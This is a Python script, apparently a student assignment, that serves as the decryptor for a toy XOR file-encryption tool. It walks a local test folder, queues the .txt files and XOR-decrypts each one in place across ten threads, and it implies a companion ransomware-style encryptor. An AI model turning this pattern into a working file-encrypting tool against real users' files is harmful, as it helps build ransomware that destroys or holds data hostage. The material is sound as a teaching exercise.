import os
import threading
import queue
from key import *

def decryptor():

    def decrypt(key):
        while q.not_empty:
            file = q.get()
            index = 0
            max_index = len(key) - 1
            try:
                with open(file, 'rb') as f:
                    data = f.read()
                with open(file, 'w') as f:
                    f.write('')
                    for byte in data:
                        xor_byte = byte ^ ord(key[index])
                        with open(file, 'ab') as f:
                            f.write(xor_byte.to_bytes(1, 'little'))
                        if index >= max_index:
                            index = 0 
                        else: 
                            index += 1
            except:
                print(f"Failed to decrypt {file}")
            q.task_done()

    encryption_level = 512 // 8
    char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789<>?,./:;[]}{|'
    char_pool_len = len(char_pool)


    encrypted_ext = ('.txt',)
    file_paths = []
    for root, dirs, files in os.walk("E:\Python Semester 2\Assignment\Test"):
        for file in files:
            file_path, file_ext = os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_ext:
                file_paths.append(root+'\\'+file)



    key = input("test")

    q =queue.Queue()
    for file in file_paths:
        q.put(file)

    for i in range(10):
        thread = threading.Thread(target=decrypt, args=(key,), daemon=True)
        thread.start()

    q.join()


